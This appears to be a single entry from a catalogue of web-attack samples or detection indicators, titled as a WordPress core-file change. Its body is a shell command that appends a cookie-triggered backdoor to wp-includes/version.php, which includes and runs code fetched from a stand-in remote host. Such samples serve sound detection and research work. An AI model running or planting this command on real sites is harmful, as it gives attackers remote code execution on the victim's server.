# category: web
# title: Core file changed to include remote code when a cookie is set
# indicator: wp-includes/version.php
cat >>/var/www/wp/wp-includes/version.php <<'PHP'
if (isset($_COOKIE['wp_tz'])) { include('https://cdn.example.net/t/' . basename($_COOKIE['wp_tz'])); }
PHP
